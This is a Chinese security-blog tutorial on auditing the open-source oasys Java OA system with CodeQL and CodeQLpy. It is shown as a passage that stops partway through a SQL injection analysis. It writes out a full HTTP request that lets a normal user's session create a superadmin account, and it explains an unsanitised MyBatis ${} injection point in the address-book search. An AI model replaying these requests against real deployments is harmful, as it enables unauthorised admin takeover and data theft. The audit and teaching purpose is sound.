---
title: JAVA半自动化代码审计实战 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18867804
source: 博客园 - 渗透测试中心
date: 2025-05-10
fetch_date: 2025-10-06T22:30:01.918121
---

# JAVA半自动化代码审计实战 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [JAVA半自动化代码审计实战](https://www.cnblogs.com/backlion/p/18867804 "发布于 2025-05-09 10:58")

## 0x01 前言

在黑盒测试中可能会忽略一些潜在的漏洞和安全问题。而`代码审计`则可以直接查看代码、深入到代码层面对系统进行全面分析和检查其执行逻辑，从而能够发现那些黑盒测试中难以发现的问题。

我个人对代码审计最喜欢的方面是其能够扩大漏洞范围。在当前的模块化开发环境中，开发人员经常编写工具类和库来实现代码的复用，简化代码。当在代码审计中发现一个工具类存在漏洞时，调用该工具类的方法都有可能存在相同的漏洞。我们只需追溯`工具类调用处`，就可以轻松发现多个漏洞。

有一句话是这么说的"`没有绝对安全的系统`"，在这里`Yu9`借用这句话引出一个观点`无论我们在手工代码审计中具备多么扎实的技术背景、丰富的经验和敏锐的洞察力，仍然会存在着一些局限性`，例如可能会出现疏漏和错误。

为了克服这些局限性，使用自动化代码审计工具可以快速识别所有可疑漏洞的位置，从而提高审计的效率和准确性。然而，我们也要认识到自动化工具的使用也有一些限制。它们依赖于已知的漏洞模式和规则，并且可能无法完全覆盖所有的漏洞类型。因此，在进行代码审计时，手工审计和自动化工具的结合使用通常是更有效的方法，以确保发现尽可能多的漏洞并提高审计的准确性。

## 0x02 声明

**遵纪守法**
请严格遵守网络安全法相关条例！
此分享主要用于交流学习，请勿用于非法用途，一切后果自付。
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

## 0x03 环境搭建

### 审计系统

**oasys**

oasys是一个OA办公自动化系统，

* 基于springboot框架开发的项目，mysql底层数据库，前端采用freemarker模板引擎，Bootstrap作为前端UI框架。
* 集成了jpa、mybatis等框架。

源码：<https://gitee.com/aaluoxiang/oa_system>

**由于是springboot项目，直接idea打开，配置一下数据库，Maven加载一下依赖就可以跑起来。**

### 工具

**CodeQL & CodeQLpy**

1）CodeQl

CodeQL 是一个语义代码分析引擎，它可以扫描发现代码库中的漏洞。使用 CodeQL，可以像对待数据一样查询代码。编写查询条件以查找漏洞的所有变体并处理，同时可以分享个人查询条件。

CodeQl教程可以参考这位师傅的文章：<https://kiprey.github.io/2020/12/CodeQL-setup/>

2）CodeQLpy

CodeQLpy是一款基于CodeQL实现的自动化代码审计工具

项目地址：<https://github.com/webraybtl/CodeQLpy>

## 0x04 源码扫描

使用CodeQLpy工具扫描源码。

1）初始化数据库，这里直接通过源码来生成数据库，所以不需要-c参数

```
python main.py -t D:\\Desktop\\oa\_system-master
```

![image-20240131011041888](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105755396-552541781.png)

2）生成数据库，如果有错请忽略，最终只要看到“成功创建数据库”就可以

```
codeql database create out/database/oa\_system-master --language=java --source-root="D:\\Desktop\\oa\_system-master" --command="D:\\Desktop\\CodeQLpy-master\\out\\decode/run.cmd" --overwrite
```

![image-20240131011425604](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105756209-534273045.png)

3）查询漏洞

```
python main.py -d D:\\Desktop\\CodeQLpy-master\\out\\database\\oa\_system-master
```

![image-20240131011656603](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105756878-1379519168.png)

![image-20240131021755851](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105757527-1570933063.png)

4）最终的会生成：csv文件，路径`CodeQLpy-master\out\result`

可以看到结果还是很清晰的

Source：漏洞关键字

SourceFunction：漏洞所在的方法名

SourcePath：漏洞所在文件地址

![image-20240131022021631](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105758173-2012459104.png)

## 0x05 漏洞分析

### 01、垂直越权获得超级管理员权限

![image-20240131035751829](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105758710-69472862.png)

这块已经给了有风险的代码`地址和方法名`，快速的定位漏洞点。这里咱全局搜索（ctrl+shift+f）

全局搜索`123456`，定位到`oa_system-master\src\main\java\cn\gson\oasys\controller\user\UserController.java`

![image-20240131012133698](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105759351-562218402.png)

阅读代码得知，这个控制器是初始化用户的功能，给了一个默认密码123456

![image-20240131013746637](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105800103-123803787.png)

寻找后发现是在用户管理模块的新增功能

![image-20240131014119460](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105800744-864834504.png)

新增用户抓取数据包

![image-20240131014551587](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105801371-58660000.png)

![image-20240131014723901](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105802481-733661659.png)

接下来登录一个普通用户的账号、可以看到这个用户是没有`用户管理`这个功能的。

抓取他的session

![image-20240131013042054](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105803205-2039003601.png)

使用普通用户的session替换掉管理员账号抓取到的数据包中的session。注意：身份证格式要规范，我用的自己的就不展示了。

![image-20240131014801196](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105804031-1633517246.png)

使用下边这个数据包的话要修改身份证哈`idCard`参数

```
POST /useredit HTTP/1.1
Host: 127.0.0.1
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: iframe
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Mode: navigate
Referer: http://127.0.0.1/useredit
Cookie: JSESSIONID=CA902F7BBA9E186241CC19593B034F47
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
sec-ch-ua: "Not\_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-User: ?1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 317

userName=test&amp;userTel=14444444444&amp;realName=%E5%BC%A0%E4%B8%89&amp;eamil=14444444444%40qq.com&amp;address=%E6%B2%B3%E5%8D%97&amp;userEdu=%E6%9C%AC%E7%A7%91&amp;school=%E9%83%91%E5%A4%A7&amp;idCard=xxxxxxxxxxxxxxxxxx&amp;bank=62175555555555433&amp;deptid=1&amp;sex=%E7%94%B7&amp;positionid=1&amp;roleid=3&amp;salary=1000&amp;hireTime=2024-01-30&amp;themeSkin=blue&amp;userId=
```

成功创建用户，并且具有超级管理员权限

![image-20240131013126951](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105804770-351832827.png)

### 02、sql注入

可以看到有三个可以漏洞点都在`AddrController`类，先办它！

![image-20240131023116507](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105805344-258236813.png)

这块是直接给出了有风险的代码位置`oa_system-master/src/main/java/cn/gson/oasys/controller/address/AddrController.java`和方法名`outAddress`

![image-20240131023037815](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105806023-2048229934.png)

可以看到调用了am的allDirector方法来处理`baseKey`，我们跟进去（ctrl+鼠标左键点击方法名）瞅瞅

![image-20240131015857588](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105806584-302463412.png)

然后就调用了数据库，这个系统使用的是mybatis，咱直接点代码前的小红鸟，跟进到xml文件瞅瞅具体的sql语句

![image-20240131025633296](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105807530-1473662627.png)

mybatis在对sql语句进行预处理时：`#{}` 进行预处理、`${}` 不进行预处理。这块在处理baseKey参数就是使用${}直接拼接。同时pinyin、outtype参数也是如此、也是拼接，也可以注入

找到功能点测试发现baseKey参数就是`外部通讯录`模块搜索功能的参数

![image-20240129141836472](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509105808318-1908...